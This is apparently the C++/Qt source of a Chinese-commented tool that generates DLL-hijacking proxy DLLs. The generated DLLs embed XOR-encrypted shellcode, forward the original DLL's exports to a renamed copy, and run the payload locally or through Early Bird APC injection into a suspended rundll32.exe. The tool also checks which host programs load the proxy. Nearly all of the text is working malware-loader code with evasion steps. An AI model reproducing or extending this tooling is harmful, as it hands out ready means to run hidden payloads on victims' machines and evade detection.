...
// 内嵌 shellcode + 透明导出转发 的完整代理DLL源码生成
// payload 已完成 SGN + XOR，传入前加密完毕
QString embeddedProxyBuildSource(const QVector<PeExportEntry> &exports,
                                 const QString &origDllName,
                                 ...
                                 bool dbgLog)
{
    ...
    if (apcInject) {
        out << "#define CREATE_SUSPENDED      0x00000004UL";
        out << "typedef struct { DWORD cb; char* r0; char* r1; char* r2;";
        out << "    DWORD dwX,dwY,dwXS,dwYS,dwXC,dwYC,dwFA,dwFlags;";
        out << "    unsigned short wShow,cbR2; unsigned char* lpR2;";
        out << "    HANDLE hI,hO,hE; } DLHHACK_SI;";
        out << "typedef struct { HANDLE hP,hT; DWORD pid,tid; } DLHHACK_PI;";
    }
    out << "";
    // ── 段2：API 导入 ──
    ...
    out << "__declspec(dllimport) void   __stdcall Sleep(DWORD);";
    if (dbgLog) {
        out << "__declspec(dllimport) void   __stdcall OutputDebugStringA(LPCSTR);";
        // 用宏简化调用
        out << "#define DBG(s) OutputDebugStringA(\"[DLLHACK] \" s)";
    } else {
        out << "#define DBG(s)";
    }
    if (apcInject) {
        out << "__declspec(dllimport) BOOL   __stdcall CreateProcessA(LPCSTR,char*,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPVOID,LPVOID);";
        out << "__declspec(dllimport) HANDLE __stdcall VirtualAllocEx(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);";
        out << "__declspec(dllimport) BOOL   __stdcall WriteProcessMemory(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);";
        out << "__declspec(dllimport) BOOL   __stdcall QueueUserAPC(LPVOID,HANDLE,uintptr_t);";
        out << "__declspec(dllimport) DWORD  __stdcall ResumeThread(HANDLE);";
    }
    out << "";
    // ── 段3：全局变量 + 内嵌 payload 字节数组 ──
    out << "static HMODULE g_hSelf    = 0;";
    out << "static HMODULE g_hOrigDll = 0;";
    out << QStringLiteral("static const char kOrigDllName[] = \"%1\";")
           .arg(ProxyGenerator::escapeCppString(origDllName));
    out << QStringLiteral("static const DWORD kPayloadSize = %1UL;").arg(payload.size());
    // 生成内嵌字节数组
    QString arrContent;
    for (int i = 0; i < payload.size(); ++i) {
        if (i > 0) arrContent += ',';
        if (i % 16 == 0) arrContent += '\n';
        arrContent += QStringLiteral("0x%1")
            .arg(static_cast<unsigned char>(payload.at(i)), 2, 16, QChar('0')).toUpper();
    }
    out << "static const unsigned char kPayload[] = {" + arrContent + "\n};";
    out << "";
    // ── 段4：辅助函数 ──
    out << "static void DllHackCopy(unsigned char* d,const unsigned char* s,SIZE_T n){SIZE_T i;for(i=0;i<n;++i)d[i]=s[i];}";
    out << "static void DllHackXor(unsigned char* d,SIZE_T n,unsigned char k){SIZE_T i;for(i=0;i<n;++i)d[i]^=k;}";
    out << "";
    // ── 段5：导出转发 proc 指针 + 轻量 jmp 桩（无寄存器保存，直接跳转）──
    for (int i = 0; i < exports.size(); ++i) {
        const auto &entry = exports.at(i);
        const QString proc  = QStringLiteral("gP_%1").arg(i);
        const QString stub  = QStringLiteral("DllHackEP_%1").arg(i);
        out << QStringLiteral("FARPROC %1 = 0;").arg(proc);
        out << QStringLiteral("void %1(void);").arg(stub);
        out << "__asm__(";
        out << QStringLiteral("    \".intel_syntax noprefix\\n\"");
        out << QStringLiteral("    \".globl %1\\n%1:\\n\"").arg(stub);
        out << QStringLiteral("    \"jmp qword ptr [rip + %1]\\n\"").arg(proc);
        out << QStringLiteral("    \".att_syntax prefix\\n\"");
        out << ");";
        out << "";
    }
    // ── 段6：导出解析函数 ──
    out << "static void DllHackResolve(void) {";
    out << "    char path[MAX_PATH]; SIZE_T zi;";
    out << "    for(zi=0;zi<MAX_PATH;++zi) path[zi]=0;";
    out << "    GetModuleFileNameA(g_hSelf, path, MAX_PATH);";
    out << "    { int pi2; for(pi2=lstrlenA(path)-1;pi2>=0;--pi2)";
    out << "        if(path[pi2]==92||path[pi2]=='/'){{path[pi2+1]=0;break;}}}";
    out << "    lstrcatA(path, kOrigDllName);";
    out << "    DBG(\"Resolve: loading orig DLL\");";
    out << "    g_hOrigDll = LoadLibraryA(path);";
    out << "    if (!g_hOrigDll) { DBG(\"Resolve: FAILED LoadLibraryA\"); return; }";
    out << "    DBG(\"Resolve: orig DLL loaded OK\");";
    for (int i = 0; i < exports.size(); ++i) {
        const auto &entry = exports.at(i);
        out << QStringLiteral("    gP_%1 = GetProcAddress(g_hOrigDll, \"%2\");")
               .arg(i).arg(ProxyGenerator::escapeCppString(entry.decoratedName));
        out << QStringLiteral("    if(!gP_%1) gP_%1=GetProcAddress(g_hOrigDll,MAKEINTRESOURCEA(%2));")
               .arg(i).arg(entry.ordinal);
    }
    out << "    DBG(\"Resolve: all exports mapped\");";
    out << "}";
    out << "";
    // ── 段7：A() —— 从内嵌字节数组执行 ──
    out << "static int A(void) {";
    out << "    DBG(\"A: entry\");";
    out << "    unsigned char* buf = (unsigned char*)HeapAlloc(GetProcessHeap(),0,kPayloadSize);";
    out << "    if(!buf){ DBG(\"A: HeapAlloc FAILED\"); return 1; }";
    out << "    DBG(\"A: HeapAlloc OK\");";
    out << "    DllHackCopy(buf,(const unsigned char*)kPayload,kPayloadSize);";
    if (xorEnabled) {
        const QString k = QStringLiteral("0x%1").arg(static_cast<uint>(xorKey),2,16,QChar('0')).toUpper();
        out << QStringLiteral("    DllHackXor(buf,kPayloadSize,%1);").arg(k);
        out << "    DBG(\"A: XOR decrypt done\");";
    }
    if (apcInject) {
        out << "    DBG(\"A: APC inject mode - creating rundll32\");";
        out << "    char target[]={'C',':','\\\\','W','i','n','d','o','w','s','\\\\',";
        out << "        'S','y','s','t','e','m','3','2','\\\\',";
        out << "        'r','u','n','d','l','l','3','2','.','e','x','e',0};";
        out << "    DLHHACK_SI si; DLHHACK_PI pi;";
        out << "    {SIZE_T zi;unsigned char* zp=(unsigned char*)&si;for(zi=0;zi<sizeof(si);++zi)zp[zi]=0;si.cb=(DWORD)sizeof(si);}";
        out << "    {SIZE_T zi;unsigned char* zp=(unsigned char*)&pi;for(zi=0;zi<sizeof(pi);++zi)zp[zi]=0;}";
        out << "    if(!CreateProcessA(target,0,0,0,0,CREATE_SUSPENDED,0,0,(LPVOID)&si,(LPVOID)&pi)){DBG(\"A: CreateProcess FAILED\");HeapFree(GetProcessHeap(),0,buf);return 1;}";
        out << "    DBG(\"A: rundll32 created suspended\");";
        out << "    LPVOID rm=VirtualAllocEx(pi.hP,0,kPayloadSize,MEM_COMMIT|MEM_RESERVE,0x40);";
        out << "    if(!rm){DBG(\"A: VirtualAllocEx FAILED\");CloseHandle(pi.hT);CloseHandle(pi.hP);HeapFree(GetProcessHeap(),0,buf);return 1;}";
        out << "    DBG(\"A: VirtualAllocEx OK\");";
        out << "    if(!WriteProcessMemory(pi.hP,rm,buf,kPayloadSize,0)){DBG(\"A: WriteProcessMemory FAILED\");CloseHandle(pi.hT);CloseHandle(pi.hP);HeapFree(GetProcessHeap(),0,buf);return 1;}";
        out << "    DBG(\"A: WriteProcessMemory OK\");";
        out << "    HeapFree(GetProcessHeap(),0,buf);";
        out << "    QueueUserAPC((LPVOID)rm,pi.hT,0);";
        out << "    DBG(\"A: QueueUserAPC done - resuming rundll32\");";
        out << "    ResumeThread(pi.hT);";
        out << "    CloseHandle(pi.hT);CloseHandle(pi.hP);";
        out << "    DBG(\"A: APC inject complete\");";
    } else {
        out << "    DBG(\"A: local exec mode - VirtualAlloc\");";
        out << "    unsigned char* em=(unsigned char*)VirtualAlloc(0,kPayloadSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);";
        out << "    if(!em){DBG(\"A: VirtualAlloc FAILED\");HeapFree(GetProcessHeap(),0,buf);return 1;}";
        out << "    DllHackCopy(em,buf,kPayloadSize);";
        out << "    HeapFree(GetProcessHeap(),0,buf);";
        out << "    DWORD op=0;";
        out << "    if(!VirtualProtect(em,kPayloadSize,PAGE_EXECUTE_READ,&op)){DBG(\"A: VirtualProtect FAILED\");VirtualFree(em,0,MEM_RELEASE);return 1;}";
        out << "    DBG(\"A: VirtualProtect OK - creating thread\");";
        out << "    HANDLE t=CreateThread(0,0,(LPVOID)em,0,0,0);";
        out << "    if(!t){DBG(\"A: CreateThread FAILED\");VirtualFree(em,0,MEM_RELEASE);return 1;}";
        out << "    DBG(\"A: shellcode thread started\");";
        out << "    WaitForSingleObject(t,INFINITE);";
        out << "    DBG(\"A: shellcode thread finished\");";
        out << "    CloseHandle(t);";
        out << "    VirtualFree(em,0,MEM_RELEASE);";
    }
    out << "    return 0;";
    out << "}";
    out << "";
    // ── 段8：DllMain ──
    // APC 模式：A() 在 DllMain 中同步执行（不用线程，无调度延迟）
    // 所有 APC 路径操作 (CreateProcess/VirtualAllocEx/WPM/QueueAPC) 均不需要 Loader Lock
    // 本地模式：使用线程但去掉 Sleep(200)，避免快速退出进程将线程杀死
    if (!apcInject) {
        out << "static DWORD __stdcall DllHackPayloadThread(LPVOID p){";
        out << "    (void)p;";
        out << "    DBG(\"PayloadThread: started\");";
        out << "    DBG(\"PayloadThread: calling A()\");";
        out << "    int r=A();";
        out << "    if(r==0) DBG(\"PayloadThread: A() success\");";
        out << "    else     DBG(\"PayloadThread: A() error\");";
        out << "    return 0;";
        out << "}";
        out << "";
    }
    ...
    out << "        DBG(\"DllMain: DLL_PROCESS_ATTACH\");";
    out << "        DllHackResolve();";
    if (apcInject) {
        // 直接同步执行，进程退出前必然完成
        out << "        DBG(\"DllMain: APC mode - calling A() directly\");";
        out << "        A();";
        out << "        DBG(\"DllMain: A() returned\");";
    } else {
        out << "        HANDLE t=CreateThread(0,0,DllHackPayloadThread,0,0,0);";
        out << "        if(t) { DBG(\"DllMain: PayloadThread created\"); CloseHandle(t); }";
        out << "        else    DBG(\"DllMain: CreateThread FAILED\");";
    }
    out << "    } else if(reason==DLL_PROCESS_DETACH){";
    out << "        if(g_hOrigDll) FreeLibrary(g_hOrigDll);";
    out << "    }";
    out << "    return TRUE;";
    out << "}";
    return out.join('\n') + '\n';
                         ...
                         bool apcInject)
{
    ...
    if (apcInject) {
        out << "#define CREATE_SUSPENDED 0x00000004UL";
        out << "#define MAX_PATH 260";
        out << "#define PAGE_EXECUTE_READWRITE 0x40UL";
        out << "typedef struct { DWORD cb; char* r0; char* r1; char* r2;";
        out << "    DWORD dwX,dwY,dwXS,dwYS,dwXC,dwYC,dwFA,dwFlags;";
        out << "    unsigned short wShow,cbR2; unsigned char* lpR2;";
        out << "    HANDLE hI,hO,hE; } DLHHACK_SI;";
    ...
    out << "int A(void) {";
    if (apcInject) {
        // 使用 DLL 绝对路径定位 code.data，避免 rundll32 工作目录不匹配
        out << "    char codeDataPath[MAX_PATH]; SIZE_T ci;";
        out << "    for(ci=0;ci<MAX_PATH;++ci) codeDataPath[ci]=0;";
        out << "    GetModuleFileNameA(g_hSelf, codeDataPath, MAX_PATH);";
        out << "    { int pi2; for(pi2=lstrlenA(codeDataPath)-1;pi2>=0;--pi2) {";
        out << "        if(codeDataPath[pi2]==92||codeDataPath[pi2]=='/'){codeDataPath[pi2+1]=0;break;}}}";
        out << "    lstrcatA(codeDataPath, \"code.data\");";
        out << "    HANDLE file = CreateFileA(codeDataPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);";
        ...
        out << "        CloseHandle(file); HeapFree(GetProcessHeap(), 0, buffer); return 1; }";
        ...
        // 注入 rundll32.exe（Early Bird APC）
        out << "    char rd32[] = {'C',':','\\\\','W','i','n','d','o','w','s','\\\\',";
        out << "        'S','y','s','t','e','m','3','2','\\\\',";
        out << "        'r','u','n','d','l','l','3','2','.','e','x','e',0};";
        out << "    DLHHACK_SI si; DLHHACK_PI pi;";
        out << "    { SIZE_T zi; unsigned char* zp=(unsigned char*)&si;";
        out << "      for(zi=0;zi<sizeof(si);++zi) zp[zi]=0; si.cb=(DWORD)sizeof(si); }";
        out << "    { SIZE_T zi; unsigned char* zp=(unsigned char*)&pi;";
        out << "      for(zi=0;zi<sizeof(pi);++zi) zp[zi]=0; }";
        out << "    if (!CreateProcessA(rd32,0,0,0,0,CREATE_SUSPENDED,0,0,(LPVOID)&si,(LPVOID)&pi)) {";
        out << "        HeapFree(GetProcessHeap(), 0, buffer); return 1; }";
        out << "    LPVOID rMem = VirtualAllocEx(pi.hP, 0, size,";
        out << "        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);";
        out << "    if (!rMem) { CloseHandle(pi.hT); CloseHandle(pi.hP);";
        out << "        HeapFree(GetProcessHeap(), 0, buffer); return 1; }";
        out << "    if (!WriteProcessMemory(pi.hP, rMem, buffer, size, 0)) {";
        out << "        CloseHandle(pi.hT); CloseHandle(pi.hP);";
        out << "        HeapFree(GetProcessHeap(), 0, buffer); return 1; }";
        out << "    HeapFree(GetProcessHeap(), 0, buffer);";
        out << "    QueueUserAPC((LPVOID)rMem, pi.hT, 0);";
        out << "    ResumeThread(pi.hT);";
        out << "    CloseHandle(pi.hT); CloseHandle(pi.hP);";
        out << "    return 0;";
    } else {
    ...
    out << "";
    if (dllMainTrigger || apcInject) {
        out << "static DWORD __stdcall DllHackPayloadThread(LPVOID param) {";
        out << "    (void)param;";
        out << "    Sleep(200);";
        out << "    A();";
        out << "    return 0;";
        ...
        out << "        DisableThreadLibraryCalls(module);";
        if (apcInject) {
            // APC 模式必须保存句柄，用于定位 code.data 绝对路径
            out << "        g_hSelf = module;";
        }
        out << "        HANDLE t = CreateThread(0, 0, DllHackPayloadThread, 0, 0, 0);";
        out << "        if (t) CloseHandle(t);";
        out << "    }";
        out << "    return TRUE;";
        out << "}";
    } else {
...
// DEF 文件：内嵌代理模式使用 DllHackEP_N 转发符号
QString embeddedDefSource(const QFileInfo &dllInfo, const QVector<PeExportEntry> &exports)
{
    QStringList out;
    out << QStringLiteral("LIBRARY \"%1\"").arg(dllInfo.fileName());
    out << "EXPORTS";
    for (int i = 0; i < exports.size(); ++i) {
        const PeExportEntry &entry = exports.at(i);
        out << QStringLiteral("    %1=DllHackEP_%2 @%3")
               .arg(defExportName(entry.decoratedName))
               .arg(i)
               .arg(entry.ordinal);
    }
    return out.join('\n') + '\n';
...
void MainWindow::buildUi()
{
    ...
    m_dllMainTrigger = new QCheckBox(QStringLiteral("DllMain 触发（线程）"));
    m_apcInject = new QCheckBox(QStringLiteral("APC注入 rundll32"));
    m_dbgLog    = new QCheckBox(QStringLiteral("DbgView调试日志"));
    ...
    processLayout->addWidget(m_dllMainTrigger);
    processLayout->addWidget(m_apcInject);
    processLayout->addWidget(m_dbgLog);
...
void MainWindow::connectSignals()
{
    ...
    connect(&m_validator, &ProxyValidator::validationFinished, this,
            [this](bool proxyLoaded, const QStringList &called, const QString &logPath, const QString &sourcePath) {
        QString summary;
        if (!proxyLoaded) {
            summary = QStringLiteral("代理 DLL 未被宿主加载（劫持路径可能无效）");
        } else if (called.isEmpty()) {
            summary = QStringLiteral("DLL 已劫持（DllMain 触发），6秒内未观察到导出函数调用");
        } else {
            summary = QStringLiteral("命中 %1 个导出函数").arg(called.size());
        }
        ...
        addVerifiedCandidate(job, proxyLoaded, called, savedCpp);
        showCalledExports(called, job, savedCpp);

        if (m_batchActive) {
            QColor statusColor;
            if (!proxyLoaded) {
                statusColor = QColor("#FF5577");
            } else if (called.isEmpty()) {
                statusColor = QColor("#FFB347"); // 橙色：已劫持但未观察到调用
            } else {
                statusColor = QColor("#00FF41"); // 绿色：命中
            }
            updateValidationStatus(m_activeJob.row, summary, statusColor);
...
{
    // proxyLoaded=true 时即使无导出调用也加入候选（DllMain 触发模式可用）
    if (job.dllPath.isEmpty() || (!proxyLoaded && called.isEmpty())) {
        return;
    }
    ...
    // 生成器下拉框标签：区分"命中导出"和"仅DllMain劫持"两种状态
    const QString targetLabel = called.isEmpty()
        ? QStringLiteral("%1  已劫持(DllMain)").arg(candidate.label)
        : QStringLiteral("%1  命中 %2").arg(candidate.label).arg(called.size());
    ...
    for (int i = 0; i < m_verifiedCandidates.size(); ++i) {
        ...
        if (QFileInfo(old.hostExe).absoluteFilePath() == QFileInfo(candidate.hostExe).absoluteFilePath()
            ...
            if (m_generatorTarget) {
                m_generatorTarget->setItemText(i, targetLabel);
            }
            return;
        }
    }
    ...
    if (m_generatorTarget) {
        m_generatorTarget->addItem(targetLabel);
...
void MainWindow::generateProxyDll()
{
    ...
    QByteArray embeddedBytes; // 提升作用域，供内嵌路径使用
    if (!binPath.isEmpty()) {
        QFile input(binPath);
        ...
        if (xorEnabled) {
            ...
            appendEvent(QStringLiteral("XOR"), QStringLiteral("已对 payload 应用 XOR，密钥：0x%1。")
                .arg(static_cast<uint>(xorKey), 2, 16, QChar('0')).toUpper());
        }
        // 内嵌模式：payload 就绪，赋给 embeddedBytes 供后续使用
        embeddedBytes = bytes;
        appendEvent(QStringLiteral("数据"), QStringLiteral("payload 就绪，大小 %1 字节，将内嵌至 DLL。").arg(bytes.size()));
    }
    ...
    const bool dllMainTrigger = m_dllMainTrigger && m_dllMainTrigger->isChecked();
    const bool apcInject      = m_apcInject      && m_apcInject->isChecked();
    const bool useEmbedded    = !binPath.isEmpty(); // binPath 非空时使用内嵌路径
    if (useEmbedded) {
        // 原始 DLL 改名为 _orig.dll，代理转发给它
        const QString origDllName = dllInfo.completeBaseName() + "_orig.dll";
        const bool dbgLog = m_dbgLog && m_dbgLog->isChecked();
        buildOut << embeddedProxyBuildSource(exports, origDllName, embeddedBytes,
                                             xorEnabled, xorKey, apcInject, dbgLog);
    } else {
        buildOut << finalBuildSource(exports, calledSet, xorEnabled, xorKey, dllMainTrigger, apcInject);
    }
    buildSource.close();
    ...
    defOut << (useEmbedded ? embeddedDefSource(dllInfo, exports) : finalDefSource(dllInfo, exports));
    defFile.close();
    ...
    args << "-fno-use-linker-plugin"
         ...
         << "-lkernel32";
    if (apcInject) {
        args << "-luser32"; // QueueUserAPC 不需要，但APC注入可能用到user32句柄
    }
    // 内嵌模式：把原始DLL改名拷贝到输出目录，供代理转发加载
    if (useEmbedded) {
        const QString origDllName = dllInfo.completeBaseName() + "_orig.dll";
        const QString origDllDest = QDir(outDir).filePath(origDllName);
        if (copyOverwrite(candidate.dllPath, origDllDest)) {
            appendEvent(QStringLiteral("改名"), QStringLiteral("原始 DLL 已复制为：%1").arg(origDllName));
        } else {
            appendEvent(QStringLiteral("错误"), QStringLiteral("无法复制原始 DLL：%1").arg(candidate.dllPath));
            return;
        }
    }
...
void MainWindow::loadVerifiedCandidatesFromLog()
{
    ...
    while (it.hasNext()) {
        ...
        addVerifiedCandidate(job, !called.isEmpty(), called, sourcePath);
        ++loaded;
    }
